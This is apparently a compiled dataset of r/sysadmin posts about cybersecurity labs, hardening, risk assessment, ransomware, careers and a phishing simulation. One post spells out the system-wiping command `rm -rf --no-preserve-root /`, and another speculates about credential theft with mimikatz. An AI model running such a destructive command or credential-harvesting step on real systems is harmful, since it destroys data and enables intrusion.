I need a hypervisor setup used for cybersecurity testing. All of the virtual machines will be segmented into their own virtual networks that NEVER leave the host. Not a big deal right? Here is the kicker: All of the VMs will be accessed by multiple users all at the same time using Apache/Guacamole by VNC'ing into the host, NOT the VM. In other words, you view the 'console' from the host, not ever actually communicating directly with the guest VM. We are talking upwards of 40-50 students all logging in to these guest VMs in teams. Each team has their own virtual subnet with typical assortment of servers and clients they have to 'protect' from malicious actors (me). I don't want to expose the management interface to anything other than the management VLAN. Currently, I have a system that uses eqmu/kvm on Jessie. It has some issues (it was put together by someone else), but overall not too shabby. I already know what is wrong and would love to fix it, but the system uses some proprietary programming by a vendor who is unwilling to share code or implement my fixes. Thus, my venture into building my own. And one last thing -- licensing. If I need a bunch of Windows Server 2012 or Windows 10 guest VMs for testing, how does that licensing work? These guest VMs will be obliterated after each cycle, test, whatever -- no longer than a month at a time. Doesn't Microsoft have a default 180 day 'trial' period or something? TDLR: \- Already have a 64 core/512GB host \- Need virtualization for 100s of systems, but only about 40-50 users will ""log in"" through Apache/Guacamole \- All VMs will NEVER leave the sandbox -- nothing in and nothing out \- Users VNC into the HOST, not the guest VM \- Proxmox, qemu/kvm, XenServer, ????"

Look we all know what shit the IT landscape is. Im a CISSP as well, and from a security standpoint its an absolute disaster waiting to immediately fall apart at the start of the next war. We know that: - 1). Government regulation of tech is going to increase dramatically. This means less software features, and a hell of a lot more monitoring and management. - 2). Cybersecurity is going to be very big as political turmoil increases. I know a lot of cybersecurity ppl are fear mongers, but like the airplane took 40 years to see a real role in combat, and we are quickly approaching that place with IT. Because its a national security issue, that means counties around the world will stop outsourcing, and only be hiring citizens of that place. This will drastically reduce competition. This is a good thing, because not only will wages go higher, but ppl can relax and innovate instead of living in fear and going by the book. - 3). Finally a lot of automation was not really automation, it was just massive cost cutting and letting things go to shit. Automation is good and has solved a lot of problems, but its been more of a boon to consultants and TED talks than anyone else... Perhaps in 40 years once we fix everything and global security is better, then it will have a less positive outlook, but until then, enjoy the approaching golden age..."

1102,cybersecurity,sysadmin,Need Help Streamlining a Perpetual Cybersecurity Lab,0,8p9icx,https://www.reddit.com/r/sysadmin/comments/8p9icx/need_help_streamlining_a_perpetual_cybersecurity/,2018-06-07 21:24:20,"I help run perpetual cybersecurity lab environments open to the public for a non-profit. These consist of workstations (desktops/laptops, usually 20-200 per lab), servers (of varying hardware, usually 10-70 per lab), and targets (grows without limit). All hardware is donated equipment and non-heterogeneous. I'm looking for a more appropriate way to automatically inventory, provision and manage these things as we grow. I'll briefly walkthrough our current process with the hopes of receiving criticism or direction. Provisioning a workstation consists of PXE booting it hard-wired to the public network. It will receive a menu from the local FOG Server and we select which disk image to install on it (usually the latest Kali Linux with updates and some small customizations). Gathering serial number is desirable for inventory, but its IP, hostname, etc are relatively inconsequential. Provisioning a server is mostly a manual affair. I give it a number, manually set the disks to RAID10 using the hardware controller, document the serial number/mac/specs by hand from the BIOS (put into a spreadsheet), plug in a CentOS USB, install manually with static IP and the Virtualization Host role. We manually create a static DHCP entry and DNS records in pfSense via webgui. Finally, I manually add the IP address to my ansible hosts inventory and do the remaining configuration using a few simple playbooks. Targets are VMs, usually defined simply by a disk image (img or qcow2 or iso) and a libvirt XML file. To launch these I move the disk image &amp; XML file to a provisioned server (scp) and use virsh to define and launch it. They have static Mac addresses (defined in the XML file), so just as the servers above we manually create a static DHCP entry and DNS record for pfSense using the webgui at least once. These are essentially black box VMs designed to be deployed/exploited/destroyed/rebuilt. Volunteers use virt-manager to build / reset / reboot targets, mostly because it looks like Virtualbox. Volunteers also have the ability to provision their own VMs for their own projects at will with the caveat they will be treated like targets. Key things that are pain points: - our inventory process is somewhere between broken and non-existent for desktops/laptops/servers/monitors/hard-drives/switches/etc; it would be great to have a starting point and hopefully automate where possible - creating static DHCP entries and DNS entries manually using pfSense webgui for both new servers and targets - provisioning servers from scratch (ie babysitting a terminal in the datacenter area) - deploying/migrating targets to servers - taking backups of all the things on a relatively frequent basis so that it can be easily redeployed if everything burns down or needs to be moved to a new site - things must be kept to minimal complexity as operations are volunteer run, with core volunteers dropping out at a moment's notice if they get a job Things considered: - make a target repository containing disk image and XML template, then design ansible roles for each to deploy them - use foreman or cobbler or maas or something to handle provisioning servers but also the static DHCP leases and DNS records so that we don't need to manually poke around the pfSense webgui - use fog or foreman or cobbler or maas or something to help automate inventory (I guess discovery is the functionality I'm looking for?) - put openstack on all of the servers and use it for DHCP (Neutron), DNS (Designate), target images (Glance), target deployment (Nova), etc - use snipe-it or lansweeper or something to manage inventory Last caveat: I personally have a huge preference for open-source/free software out of principle, so please don't suggest something like VMWare as a solution."

I have enjoyed a lot of the content on here and it has helped develop my career a great deal, so thank you! Apologies in advance for the nontraditional subject matter of the question, but I would greatly appreciate your advice and input. As everyone is aware security has become a serious issue facing all businesses, and in today's world where vendors and service providers are hocking the 'newest technologies' and not building relationships, it can be hard to build a cybersecurity program that is more than just an amalgamation of tools. Cybersecurity, properly understood, is a fascinating blend of IT and Business risk that must be managed with the participation of various stakeholders. It is with this goal that I have put together a team and we are launching an MSSP. I am most certainly not trying to sell anyone here, but I was hoping to ask a question: if you could craft a cybersecurity service provider what are the key differentiators that would be useful for your organization. I know this is not a one size fits all answer, but I would love your thoughts on the subject. As background, we're launching a full service shop with everything from SOC-as-a-Service to WISP development and pen testing, etc. Where we hope to differentiate ourselves is to help bolster your cybersecurity efforts. Our founders are not only technologists, but two of them are attorneys with extensive experience in cyber and privacy law. Essentially, we want to help companies develop a comprehensive approach to security, blending technology, policies &amp; procedures, and other norms/standards. Thank you, in advance, for your help TL:DR Let me know the products, services, assistance that you would like to see in an MSSP partner."

The goal of the lab is to get people to attack us so we can analyze how they compromised us if they do. (Basically, a honeypot.) So far, I've done what I've been asked - I was brought on because they were having problems with virtualizing pfSense on XenServer, and one of their static IPs from Comcast flat-out refused to work. They even had an instance of pfSense running that nobody had the credentials to - nobody knew what it was doing for about six months. After many hours of banging my head against a table, I managed to fix the problems and get the network and the VMs online so we could move into the ""experimental"" phase. My concern is that ""good IT practices"" are not being followed at all in this lab environment and may/will taint the experiment. Admin-level pfSense accounts have been granted to everybody, including people don't need it (anyone can access the bare-metal pfSense web UI through OpenVPN). The root password for XenCenter has been shared with *everyone* by the person who runs the lab (again, including people who don't need it). All of our passwords - from XenServer all the way down to the individual VMs connected to the virtualized pfSenses - are *identical* and easily brute-forceable. The last straw for me was when he wanted me to let users bypass connecting to the physical pfSense with OpenVPN, opening up port 22 on one of the virtual pfSense instances that I had set up (port being forwarded to an Ubuntu VM with an exploitable, out-of-date version of sshd) and exposing it to the world (because ""XenCenter is slowing us down the workflow of our other team""), using the root account with a weak password. I pushed back and asked that we at least set up some kind of whitelist of authorized IPs, create individual non-root user accounts, create SSH keys for those users, or at the very least set up something like fail2ban. I was overruled on all of these things, because: &gt;""In my 20+ years of computing, I've never been hacked with an open port 22."" At this point, I'm surprised nobody has either accidentally or maliciously issued a `rm -rf --no-preserve-root /` or set XenServer on fire. What can I do in the future to enforce that best practices are followed, especially if the person running the lab refuses to even begin to let some of us take basic steps to secure our setup?"

I posted this over as a comment on the /r/netsec discussion thread. I wanted to see if I could get a little feedback here. Our networking team is looking to roll out a new network management solution. Their selection is WhatsUp Gold 2018. I am working on the hardened Server 2016 image, hardened SQL Server instance, hardened SQL Server databases, and hardened IIS. I have not previously gone super deep into SQL Server and IIS. I have SQL Server experience with managing user accounts, stored procedures, databases, etc. I have almost no experience with IIS and have administered only LAMP type configurations for web applications. I am also the most experienced person on this program when it comes to sysadmin and cybersecurity work. I have a few concerns about how WhatsUp Gold configures itself. The company itself highly recommends that their software is set up behind a firewall (of course) and not accessible to the Internet. This configuration will not be accessible to the Internet. My concerns are as follows: * WhatsUp Gold by default creates a user in the Administrators group that is used for running the console and iDrone worker processes. * WhatsUp Gold by default creates a database user with the sysadmin role in SQL Server * WhatsUp Gold by default sets itself up with SQL Server mixed mode authentication instead of NTLM authentication for the created database user My concerns here are that the default configuration does not do any containment and just gives everything control over the server and database instance. The site page itself runs under an IIS virtual account, but the console and iDrone applications are in a single application pool and run under the created user in the Administrators group. The software also sets this user password to never expire (for obvious reasons) which also violates our security policies. I have read up on and tried changing the ApplicationGroup identity to a virtual account in IIS and giving that virtual account access to the files. This breaks the console. I have tried setting many different settings for the site, and they all break the console. Running the applications under the LocalSystem context works, but to me that seems more insecure than a separate user account with admin privileges. My thinking here is that in the event that the application is compromised, the account under which the worker threads are running has full access to the underlying system. If this is somehow not the case with IIS, please correct me. The WUG documentation provides no information on what permissions are required for the user account or how to run the console as an IIS virtual account. The database user is given the sysadmin role by default. My thinking here is that if the DB user were compromised through say SQL injection, this account would also have full control over the SQL Server instance. I am planning to work with the vendor on this. Am I off base with these concerns? While I believe I could create a separate user group WITHOUT administrator permissions, make the console user a member of that group, and set permissions accordingly, I really have to wonder why it's done the way it is by default. Any insights? As for the database user and our password policies, is there any reason I couldn't instead make this a virtual account like NT SERVICE\WUG_USER and use NTLM authentication to SQL Server? This would allow Windows to manage the password rotation, not require us to pursue a waiver, and require less manual intervention. Am I on the right track with this thinking? While, I am going to try to get a WUG engineer in here to work with me, I wanted to throw these questions out to the community to be sure that I'm foremost not being an idiot and furthermore on the right track with my thinking."

I do post here on occasion despite that, but in a sense that I totally understand the topic in question and feel I can contribute in a beneficial way. --- My school got a new IT Director awhile back, we technically have two. One is in charge of the Chromebooks and the other is left with the infrastructure. I approached the new IT Director a few weeks before summer started and told him that Id be available during the summer if he needed anything. At the time I was a sophomore in high school. To my surprise, around 2-weeks into summer I received a call asking if Id consider a paid internship. I took him up on his offer and started working the following week. Initially, he had me to fairly basic but time-consuming tasks. My first project was to upgrade the existing AIOs that we had. They were Dell Optiplex computers with an HDD and 4GB of RAM and replace them with SSDs and 8-12GB of RAM. My tasks grew as time went on, we got brand new Promethean boards which I updated, calibrated, etc The school year started, and hed still give me work here and there such as replacing older computers. Over the following school year, I worked to assemble a team which he refers to as his A-Team. Its 5 students total, including myself. Im the team leader. Over the summer I worked with one other student to continue upgrades on different computers, run network cables, mount TVs, and much more. Im now in my senior year, 18 years old, and will be going to college. My last day is April 27th and I begin classes October 1st. Im going to be studying cybersecurity or information technology in college. When talking to the IT Director, I mentioned this during one of our casual talks. He seemed delighted that Id be around for ~5 months. About a week after that he asked if Id be interested in working this summer. I thought it was a continuation of my internship, but shortly after that it was proposed to me as an actual job for 5 months. Im currently getting paid $10/hour under my paid internship. I have a meeting after my return from break with the CFO and IT Director to discuss everything. I did forget to mention that nobody else was offered this. It could be because of the circumstances where Ill be around for 5 months, but Im more hoping itll lead to an opportunity down the road. My IT Director plans to retire in the next 3-4 years, and the college Im going to works in a way where Id have a bachelors in 3-years. Not to be too optimistic, but I may have a shot at stepping into his position upon graduation since I can work on my masters completely online. I felt like sharing this with the community since through reading comments Ive learned a lot pertaining to my future. Again sorry if this is against the guidelines, but I felt the need to share this!

1116,cybersecurity,sysadmin,How to perform IT Risk Assessment,289,7r9xa2,https://www.reddit.com/r/sysadmin/comments/7r9xa2/how_to_perform_it_risk_assessment/,2018-01-19 01:11:25,"Cybersecurity is all about understanding, managing, controlling and mitigating risk to your organizations critical assets. Whether you like it or not, if you work in security, you are in the risk management business. To get started with IT security risk assessment, you need to answer three important questions: 1. What are your organizations critical information technology assets  that is, the data whose exposure would have a major impact on your business operations? 2. What are the top five business processes that utilize or require this information? 3. What threats could affect the ability of those business functions to operate? Once you know what you need to protect, you can begin developing strategies. However, before you spend a dollar of your budget or an hour of your time implementing a solution to reduce risk, you should be able to answer the following questions: 1. What is the risk you are reducing? 2. Is it the highest priority security risk? 3. Are you reducing it in the most cost-effective way? These questions get to the heart of the problem  that it is all about risk. # What is Risk? Risk is a business concept  is the likelihood of financial loss for the organization high, medium, low or zero? Three factors play into risk determination: what the threat is, how vulnerable the system is, and the importance of the asset that could be damaged or made unavailable. Thus, risk can be defined as follows: **Risk = Threat x Vulnerability x Asset** Although risk is represented here as a mathematical formula, it is not about numbers; it is a logical construct. For example, suppose you want to assess the risk associated with the threat of hackers compromising a particular system. If your network is very vulnerable (perhaps because you have no firewall and no antivirus solution), and the asset is critical, your risk is high. However, if you have good perimeter defenses and your vulnerability is low, and even though the asset is still critical, your risk will be medium. There are two special cases to keep in mind: * *Anything times zero is zero. If any of the factors is zero, even if the other factors are high or critical, your risk is zero.* * *Risk implies uncertainty. If something is guaranteed to happen, it is not a risk.* Here are some common ways you can suffer financial damage: * **Data loss.** Theft of trade secrets could cause you to lose business to your competitors. Theft of customer information could result in loss of trust and customer attrition. * **System or application downtime.** If a system fails to perform its primary function, customers may be unable to place orders, employees may be unable to do their jobs or communicate, and so on. * **Legal consequences.** If somebody steals data from one of your databases, even if that data is not particularly valuable, you can incur fines and other legal costs because you failed to comply with the data protection security requirements of HIPAA, PCI DSS or other compliance Now lets walk through the risk assessment procedure. # Step 1: Identify and Prioritize Assets Assets include servers, client contact information, sensitive partner documents, trade secrets and so on. Remember, what you as a technician think is valuable might not be what is actually most valuable for the business. Therefore, you need to work with business users and management to create a list of all valuable assets. For each asset, gather the following information, as applicable: * Software * Hardware * Data * Interfaces * Users * Support personnel * Mission or purpose * Criticality * Functional requirements * IT Security policies * IT Security architecture * Network topology * Information storage protection * Information flow * Technical security controls * Physical security environment * Environmental security Because most organizations have a limited budget for risk assessment, you will likely have to limit the scope of the project to mission-critical assets. Accordingly, you need to define a standard for determining the importance of each asset. Common criteria include the assets monetary value, legal standing and importance to the organization. Once the standard has been approved by management and formally incorporated into the risk assessment security policy, use it to classify each asset you identified as critical, major or minor. # Step 2: Identify Threats A threat is anything that could exploit a vulnerability to breach security and cause harm to your organization. While hackers and malware probably leap to mind, there are many other types of threats: * **Natural disasters.** Floods, hurricanes, earthquakes, fire and other natural disasters can destroy much more than a hacker. You can lose not only data, but the servers and appliances as well. When deciding where to house your servers, think about the chances of a natural disaster. For instance, dont put your server room on the first floor if your area has a high risk of floods. * **System failure.** The likelihood of system failure depends on the quality of your computer For relatively new, high-quality equipment, the chance of system failure is low. But if the equipment is old or from a no-name vendor, the chance of failure is much higher. Therefore, its wise to buy high-quality equipment, or at least equipment with good support. * **Accidental human interference.** This threat is always high, no matter what business you are in. Anyone can make mistakes such as accidentally deleting important files, clicking on malware links, or accidentally physical damaging a piece of equipment. Therefore, you should regularly back up your data, including system settings, ACLs and other configuration information, and carefully track all changes to critical systems. * **Malicious humans.** There are three types of malicious behavior: **Interference** is when somebody causes damage to your business by deleting data, engineering a distributed denial of service (DDOS) against your website, physically stealing a computer or server, and so on. **Interception** is classic hacking, where they steal your data. **Impersonation** is misuse of someone elses credentials, which are often acquired through social engineering attacks or brute-force attacks, or purchased on the dark web. # Step 3: Identify Vulnerabilities Third, we need to spot vulnerabilities. A vulnerability is a weakness that a threat can exploit to breach security and harm your organization. Vulnerabilities can be identified through vulnerability analysis, audit reports, the NIST vulnerability database, vendor data, commercial computer incident response teams, and system software security analysis. Testing the IT system is also an important tool in identifying vulnerabilities. Testing can include the following: * Information Security test and evaluation (ST&amp;E) procedures * Penetration testing techniques * Automated vulnerability scanning tools You can reduce your software-based vulnerabilities with proper patch management. But dont forget about physical vulnerabilities. For example, moving your server room to the second floor of the building will greatly reduce your vulnerability to flooding. # Step 4: Analyze Controls Analyze the controls that are either in place or in the planning stage to minimize or eliminate the probability that a threat will exploit vulnerability in the system. Controls can be implemented through technical means, such as computer hardware or software, encryption, intrusion detection mechanisms, and identification and authentication subsystems. Nontechnical controls include security policies, administrative actions, and physical and environmental mechanisms. Both technical and nontechnical controls can further be classified as preventive or detective controls. As the name implies, preventive controls attempt to anticipate and stop attacks. Examples of preventive technical controls are encryption and authentication devices. Detective controls are used to discover attacks or events through such means as audit trails and intrusion detection systems. # Step 5: Determine the Likelihood of an Incident Assess the probability that a vulnerability might actually be exploited, taking into account the type of vulnerability, the capability and motivation of the threat source, and the existence and effectiveness of your controls. Rather than a numerical score, many organizations use the categories high, medium and low to assess the likelihood of an attack or other adverse event. # Step 6: Assess the Impact a Threat Could Have Impact analysis should include the following factors: * The mission of the system, including the processes implemented by the system * The criticality of the system, determined by its value and the value of the data to the organization * The sensitivity of the system and its data The information required to conduct an impact analysis can be obtained from existing organizational documentation, including a business impact analysis (BIA) (or mission impact analysis report, as it is sometimes called). This document uses either quantitative or qualitative means to determine the impact that would be caused by compromise or harm to the organizations information assets. An attack or adverse event can result in compromise or loss of information system confidentiality, integrity and availability. As with the likelihood determination, the impact on the system can be qualitatively assessed as high, medium or low. The following additional items should be included in the impact analysis: * The estimated frequency of the threats exploitation of a vulnerability on an annual basis * The approximate cost of each of these occurrences * A weight factor based on the relative impact of a specific threat exploiting a specific vulnerability # Step 7: Prioritize the Information Security Risks For each threat/vulnerability pair, determine the level of risk to the IT system, based on the following: * The likelihood that the threat will exploit the vulnerability * The impact of the threat successfully exploiting the vulnerability * The adequacy of the existing or planned information system security controls for eliminating or reducing the risk A useful tool for estimating risk in this manner is the risk-level matrix. A high likelihood that the threat will occur is given a value of 1.0; a medium likelihood is assigned a value of 0.5; and a low likelihood of occurrence is given a rating of 0.1. Similarly, a high impact level is assigned a value of 100, a medium impact level 50, and a low impact level 10. Risk is calculated by multiplying the threat likelihood value by the impact value, and the risks are categorized as high, medium or low based on the result. # Step 8: Recommend Controls Using the risk level as a basis, determine the actions that senior management and other responsible individuals must take to mitigate the risk. Here are some general guidelines for each level of risk: * **High** A plan for corrective measures should be developed as soon as possible. * **Medium**  A plan for corrective measures should be developed within a reasonable period of time. * **Low**  The team must decide whether to accept the risk or implement corrective actions. As you consider controls to mitigate each risk, be sure to consider: * Organizational policies * Cost-benefit analysis * Operational impact * Feasibility * Applicable regulations * The overall effectiveness of the recommended controls * Safety and reliability #Step 9: Document the Results The final step in the risk assessment process is to develop a risk assessment report to support management in making appropriate decisions on budget, policies, procedures and so on. For each threat, the report should describe the corresponding vulnerabilities, the assets at risk, the impact to your IT infrastructure, the likelihood of occurrence and the control recommendations. Here is a very simple example: URL You can use your risk assessment report to identify key remediation steps that will reduce multiple risks. For example, ensuring backups are taken regularly and stored offsite will mitigate the risk of accidental file deletion and also the risk from flooding. Each of these steps should have the associated cost and should deliver real benefit in reducing the risks. Remember to focus on the business reasons for each improvement implementation. As you work through this process, you will get a better idea of how the company and its infrastructure operates and how it can operate better. Then you can create risk assessment policy that defines what the organization must do periodically (annually in many cases), how risk is to be addressed and mitigated (for example, a minimum acceptable vulnerability window), and how the organization must carry out subsequent enterprise risk assessments for its IT infrastructure components and other assets. Always keep in mind that the information security risk assessment and enterprise risk management processes are the heart of the cybersecurity. These are the processes that establish the rules and guidelines of the entire informational security management, providing answers to what threats and vulnerabilities can cause financial harm to our business and how they should be mitigated.

I'm a sys admin supervisor at a hospital, too, and I'm trying to glean some information as to how the hell this attack got so out of control. The only thing I could think was the attacker used the compromised vendor account to sign into a server and then used mimikatz to get some domain admin creds, and then hopped to somewhere bigger like a domain controller to infect Sysvol or something, and then it propagated to all servers and workstations, but, like, seriously? And the backups were hit, too? Does anybody work there, or know anybody who works there? Or, there have been a few other massive ransomware attacks at hospitals over the last few years, specifically Mercy Health in the Maryland/DC area--anybody familiar with any of those? Thanks!"

Been here about 10 months now and realized it's not the environment for me. I'm a high achiever, non-mediocre worker, and this company is just the opposite. I've complained to the IT Director. He said he knows everything I told him, and hasn't done a thing to change anything. Started applying for jobs. At one point, I had 14 applications out and hadn't heard anything. Last week, I applied for a Cybersecurity Engineer position, heard right back (I have Security+ cert) and as one thing lead to another, I just got a written offer from them yesterday. The position sounds really exciting to me, and they are also willing to train someone like me to do the work, so it has a huge opportunity cost. As the company grows, so will I, and they have a really good plan in place for my personal career growth. It's a work from home position, flexible schedule, unlimited PTO, and they seem to be headed on the right track. The company is growing very rapidly according to the CEO. There was a range listed on the job posting, and as they were very impressed with me, the offer is at the maxed out upper end of the range. The hard part, however, is that the offer comes in at about $3k less than my total compensation. The salary they offered me is higher than my current salary, but there are perks at my current job like Health Savings Account matching, cell phone reimbursement, etc. that don't exist at the new company. Also included in the security offer is a condition that once I successfully pass two security related certifications, they will raise my salary by $5k. It wasn't specified which party would pay for the certs. I thought I had an offer from a company I previously worked for in the pipeline, but it looks like that isn't going to turn out. So I don't have the leverage from another offer. This threw a wrench in my plan, because I told the security company I had another offer in the pipeline and needed to some time but that I should know by the end of the week. Plan A is to email the Hiring Manager (who is also the CEO) back and tell him that after crunching the numbers, I'd be taking a $3k compensation cut, and that it doesn't make sense to me to take a lower paying job overall, and politely ask if there's anywhere we can find another $3k to put somewhere in the offer (salary, benefits, something???) If that comes back as not possible, Plan B is to suggest that the company pay for the certs, or at least the first time of taking the test. The certs I'd likely be taking are $400 and $500 respectively, and if I count that as a ""professional development"" perk, I'd be willing to take the position, work really hard to get those certs quickly (maybe 3-6 months?) and then with raised salary I'd be at about $3k more than my current compensation and on a new specialized career path. Any thoughts? Am I totally out of line? Ideas? Am I missing something?"

I'm fresh out of college (this past December) with a degree in History/Social Studies Secondary Education. I've always been good with computers though, and have been doing computer work on the side for about 8 years now. I recently got a job as Desktop and Hardware Support for a moderately large ($30~ million) dental company. When I was hired, the position was essentially installing RAM upgrades, doing Windows Updates, etc. - very basic IT stuff, for $33k/year. Once my boss realized that I am able to do *far* more, I've been taking on way more responsibility. I'm now responsible for: * Building, ordering, inventory management, and accounting for every computer, scanner, printer, and tablet that we use. * Building, ordering, inventory management, and accounting for every computer that we sell to labs around the country - very high end systems ($2k/each, roughly) * Cybersecurity on our entire network including managing several APs, hardware firewalls, and servers. * Upkeep and maintenance of all of our data servers * SQL server management and report writing * AD administration for 17 locations across 6 states; 600-700 users at any moment, around 500 devices * WSUS administration * Licensing for all of our software and hardware - OSes, Office 365, Exchange * Exchange server management * Installation and repair for our $50,000 3D printers, CNC machines, and 3D scanners * All of our networking, both internal and external, everything from NIC cards to MPLS networking. Our IT department is small - we have the IT Manager who handles all the business decisions (making around $75k or so), the IT Analyst whose primary task is writing reports as needed (makes about same as me), and the IT Desktop/Hardware Support who does the computer repairs and upgrades. We were outsourcing our server upkeep and networking, but since I can do all of it (usually), we are cutting that contract in January to once a month instead of once a week. I had my 3 month review 2 weeks ago and received a $3,000/year raise (up to $36k now), but that felt like nothing. I realize, though, that the department head doesn't make much either, and that I also don't even have a degree in IT, but I have had every person in upper management in the company tell me that I'm the best thing that has happened to the company in 20 years. Once my boss retires, the current Analyst is going to take her job, and we are going to hire a part time college kid to do the low level IT stuff so I can focus on the higher-level work. It hasn't been made clear to me if that comes with a promotion though, or if my responsibilities will just shift. I look at job descriptions and read about what other people are doing, and I see so many people doing essentially just what I hired in for that are starting at $55k or more. Now I'm doing overseas training soon for $250,000 machines - I feel like I'm being robbed, but I just got a raise.. I don't know if it would be inappropriate to ask for an official promotion with a salary closer to what my responsibilities are when my boss retires. She has told me repeatedly that she sees me leaving the IT department within the year and moving over to our production (mills/printers/scanners) since I can make so much more money and be even more useful there, but again, no indication of an actual promotion or anything happening yet. I've only been there since June, so I don't want to stir up any trouble, but I want to be paid what I'm worth. Am I just stuck at the slow-raise for now? Any advice would be appreciated. I know I'm worth more than what I'm getting paid, I just don't know the course to go about it since my situation is pretty unusual."

The risk that the Russian government, whether acting on its own or in collaboration with Kaspersky, could capitalize on access provided by Kaspersky products to compromise federal information and information systems directly implicates U.S. national security. &gt;The directive comes months after the federal General Services Administration, the agency in charge of government purchasing, removed Kaspersky from its list of approved vendors. In doing so, the GSA suggested a vulnerability exists in Kaspersky that could give the Kremlin backdoor access to the systems the company protects. &gt;In a statement to The Washington Post on Wednesday, the company said: Kaspersky Lab doesnt have inappropriate ties with any government, which is why no credible evidence has been presented publicly by anyone or any organization to back up the false allegations made against the company. The only conclusion seems to be that Kaspersky Lab, a private company, is caught in the middle of a geopolitical fight, and its being treated unfairly even though the company has never helped, nor will help, any government in the world with its cyberespionage or offensive cyber efforts. &gt;Kaspersky Lab has always acknowledged that it provides appropriate products and services to governments around the world to protect those organizations from cyberthreats, but it does not have unethical ties or affiliations with any government, including Russia, the firm said. &gt;The directive comes in the wake of an unprecedented Russian operation to interfere in the U.S. presidential election that saw Russian spy services hack the networks of the Democratic National Committee and other political organizations and release damaging information. &gt;At least a half-dozen federal agencies run Kaspersky on their networks, the U.S. officials said, although there may be other networks where an agencys chief information security officer  the official ultimately responsible for systems security  might not be aware it is being used. &gt;The order applies only to civilian government networks, not the militarys. But the Defense Department, which includes the National Security Agency, does not generally use Kaspersky software, officials said. &gt;The U.S. intelligence community has long assessed that Kaspersky has ties to the Russian government, according to officials who spoke on the condition of anonymity to discuss internal deliberations. The companys founder, Eugene Kaspersky, graduated from a KGB-supported cryptography school and had worked in Russian military intelligence. &gt;In recent months concern has mounted inside the government about the potential for Kaspersky software to be used to gather information for the Russian secret services, officials said. &gt;Richard Ledgett, former NSA deputy director, hailed the move. Speaking Wednesday on the sidelines of the Billington CyberSecurity Summit in Washington, he noted that Kaspersky, like other Russian companies, is bound to comply with the directive of Russian state security services, by law, to share with them information from their servers. &gt;Concerns about Kaspersky software had been brewing for years, according to one former official who told The Post that some congressional staffers were warned by federal law enforcement officials as early as November 2015 not to meet with employees from Kaspersky, over concerns about electronic surveillance. &gt;When the GSA announced its July decision, it underscored that its mission was to ensure the integrity and security of U.S. government systems and networks and that Kaspersky was delisted after review and careful consideration. The action removed the company from the list of products approved for purchase on federal systems and at discounted prices for state governments. &gt;The directive will also put pressure on state and local governments that use Kasperskys products. Many had been left to speculate about the risks of sticking with the company or abandoning taxpayer-funded contracts, sometimes at great cost. In July, The Post found several state or local agencies that used Kasperskys anti-virus or security software had purchased or supported the software within the past two years. [Link](URL"

Once more I must deal with this accursed company, but not because theyre wasting development time trying to extract more money from their customers this time, but rather because of some very bizarre application security decisions.

Taking this up with technical support: &gt; Me: because access passes through http, https security is broken &gt; Agent: Okay, if thats your main concern, then what I would recommend doing is turning off click tracking in order to stop the redirect. Eventually they suggested to use someone elses click tracking: &gt; Agent: So I did some additional research, and it looks like this is expected behavior for our click tracking. What I would recommend doing here, instead of using our click tracking would be to try Google Analytics tracking in order to obtain subscriber behavior data to avoid our redirecting. However I pressed the issue &gt; I do want to assure you that the security of the application is of the utmost priority. As it stands right now, this would be the expected behavior when click tracking is enabled within a campaign to route through http. As I mentioned, our developers are currently gathering feedback on this behavior and Ill be sure to pass along the details of this ticket to them. So there you have it. Taking your perfectly good https links and rewriting them to http is expected behaviour. What a bunch of amateurs."

Back in the old days we would hand those credentials over in a sealed envelope and all that, but times have changed and I am trying to make sure that we don't expose the company to liability as well as security issues. My understanding is RBAC is not just about user permissions but controls in general so I believe I cannot hand those over but want to check with others who have more experience with contractual RBAC implementations. Edit: Some people thought my post was about not wanting to hand these out so I removed all extra information to make this concise. To clarify, my concern is with our contractual obligations to implement RBAC and whether giving the passwords away breaks our contractual obligation as we cannot afford to lose these clients.

My coworker wants to know if we can set one single local admin password across all machines and change that password globally as we need to by using LAPS? Or is LAPS specifically designed for giving different machines their own individual admin password? If so, what is a good alternative for what we want? Ideally, LAPS is far more secure than what they're asking for, which is to just have one admin password for all machines that we can easily change, but for the time being I suppose that's enough (though the cybersecurity major in me dies a little bit inside thinking about it.)

Next up will be to get my hands on some of the different software that companies offer in this space - a good number of the low cost options I already do - but that's another story for anther thread. thank you everyone!"

The thinking being, ""space is cheap."" Have any of you changed this this philosophy in recent times? Outside finance/health (or other regulated industries), it seems odd to me to want to retain emails for very long at all. It'd require retraining of some employees to store important communications in systems besides email, but I just don't see how you can justify indefinite retention policies which expose you to expanded cybersecurity risk as well as expanded production obligations in the event of a lawsuit. Questions here are: (1) am I right/wrong to think like this (or what am I missing); (2) what are your current policies; (3) have they been recently revised, and if so, have you expanded or narrowed retention?

I know in a Sysadmin role, in a broad definition, you are responsible for maintaining and keeping the system available for the users to be able to do their work without any interruptions.

So I was asked to help set up a phishing campaign and phish our team. I set up a notification to come from one of our third party providers saying they experienced a network breach and asked all users to change their password and the link took them to a lookalike login screen that could steal your credentials (obviously it didn't) So we send out the phish campaign and all hell breaks loose. My boss texts me about the hack and how we need to inform everyone now. And I tell him to chill because it was a phishing attempt. Then he gets frustrated saying the phish was too realistic and it caused too much panic. A few members on the team also said it was too real and no phishing attempt would be that subtle and that we needed to dumb down the attempts. FML.

I am a reasonably experienced admin with many years in integration but little in the way of formal ""certified"" education in enterprise level security. TASK: They have asked me to help educate the upper management in understanding the information security threat environment so that we can plan and budget for additional architecture, effort, or even outside consultation. We also want to establish a more formalized security policy and framework. In my search I have found mostly videos &amp; material targeted at entry level users (ie: guyz make your passwords long1!!!1) or stuff directed at industry pros that is too high level. Is there material out there that is appropriate for a mixed crowd of engineers, tech pros, and exec level management that can help us move to stronger security awareness and posture? I have looked at the NIST Cybersecurity Framework 1.0 and it seems a great place to start but I'd like to put out a call for help in locating good videos, books, references, policies, etc. that will help a small business. Yes, I know I can google all day long but I'm hoping you guys can help me narrow the search or provide recommendations, share experiences, whatever. Thanks!"
